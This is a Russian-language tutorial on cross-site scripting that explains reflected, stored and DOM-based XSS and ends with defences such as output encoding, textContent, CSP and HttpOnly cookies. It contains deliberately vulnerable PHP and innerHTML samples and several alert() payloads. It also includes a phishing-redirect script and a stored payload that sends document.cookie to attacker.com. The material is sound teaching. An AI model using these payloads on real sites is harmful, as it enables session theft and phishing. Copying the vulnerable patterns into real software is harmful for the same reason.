**Cross-Site Scripting (XSS)** — это тип уязвимости, при котором злоумышленник внедряет вредоносный JavaScript-код в веб-страницу, просматриваемую другими пользователями.

Существует **три основных вида XSS**: Reflected (отраженный), Stored (хранимый) и DOM-based. Ниже приведены примеры для каждого типа, а также классические полезные нагрузки (payloads) и способы защиты.

## 1. Reflected XSS (Отраженный)

Код инъекции передается в самом запросе (например, через URL-параметры или форму) и сразу же «отражается» сервером в ответе без надлежащей фильтрации.

### Сценарий

Уязвимый поиск на сайте:

HTML

```
<!-- Сервер возвращает: -->
<p>Результаты поиска для: <?php echo $_GET['search']; ?></p>
```

### Вредоносная ссылка

Злоумышленник отправляет жертве ссылку:

Plaintext

```
https://example.com/search?search=<script>alert('Reflected XSS')</script>
```

### Результат

Браузер жертвы получает HTML с внедренным тегом `<script>` и выполняет его.

## 2. Stored XSS (Хранимый / Накопительный)

Самый опасный тип. Вредоносный код сохраняется на сервере (в базе данных, комментариях, профиле пользователя) и затем отдается всем пользователям, открывающим уязвимую страницу.

### Сценарий

Форма отправки комментария на форуме. Пользователь вводит текст в поле «Комментарий»:

HTML

```
<script>
  // Кража Cookie (например, идентификатора сессии) и отправка на сервер хакера
  fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

### Результат

1. Комментарий сохраняется в БД.
    
2. Каждый раз, когда любой пользователь (или администратор) открывает страницу статьи, его браузер загружает этот комментарий из БД и автоматически исполняет скрипт, отдавая свои сессионные куки злоумышленнику.
    

## 3. DOM-based XSS

Проблема возникает полностью на стороне клиента (в JavaScript), когда сценарий берет данные из контролируемого пользователем источника (например, `location.hash` или `location.search`) и передает их в «опасный приемник» (`eval()`, `innerHTML`, `document.write()`).

### Уязвимый JavaScript-код

JavaScript

```
// Код на клиентской стороне
const params = new URLSearchParams(window.location.search);
const name = params.get('name');

// Использование опасного свойства innerHTML
document.getElementById('welcome').innerHTML = "Привет, " + name;
```

### Эксплойт

Пользователь переходит по ссылке:

Plaintext

```
https://example.com/index.html?name=<img src=x onerror=alert('DOM_XSS')>
```

### Результат

Браузер пытается рендерить картинку с некорректным источником `src=x`, вызовет событие `onerror` и выполнит JavaScript.

## Распространенные векторы и пейлоады (Payloads)

Интерпретаторы HTML/JS разнообразны, поэтому XSS — это не только тег `<script>`. Часто используются события элементов:

### 1. Через тег `<img>` (через ошибку загрузки)

HTML

```
<img src="invalid-image.jpg" onerror="alert('XSS via IMG')">
```

### 2. Через атрибут `href` в ссылках (`javascript:`)

HTML

```
<a href="javascript:alert('XSS via Link')">Кликни меня</a>
```

### 3. Через обход простые фильтров (Payloads в событиях SVG / Body)

HTML

```
<!-- SVG тег -->
<svg onload="alert('XSS via SVG')">

<!-- Автофокус на поле ввода -->
<input type="text" autofocus onfocus="alert('XSS via Input')">
```

### 4. Редирект пользователя на фишинговый сайт

HTML

```
<script>
  window.location.href = "https://phishing-fake-login.com";
</script>
```

## Как защититься от XSS?

1. **Контекстное кодирование/экранирование (Context-aware HTML Encoding):**
    
    Все пользовательские данные перед вставкой в HTML должны экранироваться.
    
    - `<` превращается в `&lt;`
        
    - `>` превращается в `&gt;`
        
    - `"` превращается в `&quot;`
        
    - `'` превращается в `&#x27;`
        
    - `&` превращается в `&amp;`
        
        _(Современные фреймворки вроде React, Angular или шаблонизатор Thymeleaf в Spring делают это автоматически)._
        
2. **Использование безопасных DOM-приемников:**
    
    Используйте `textContent` или `innerText` вместо `innerHTML`.
    
3. **Content Security Policy (CSP):**
    
    Настройка HTTP-заголовка `Content-Security-Policy`, который запрещает выполнение встроенных (inline) скриптов и ограничивает источники, с которых можно загружать JS.
    
    HTTP
    
    ```
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
    ```
    
4. **Флаг `HttpOnly` для Cookie:**
    
    Установка флага `HttpOnly` на чувствительные куки (например, `JSESSIONID`). Это запрещает доступ к ним через `document.cookie` из JavaScript.
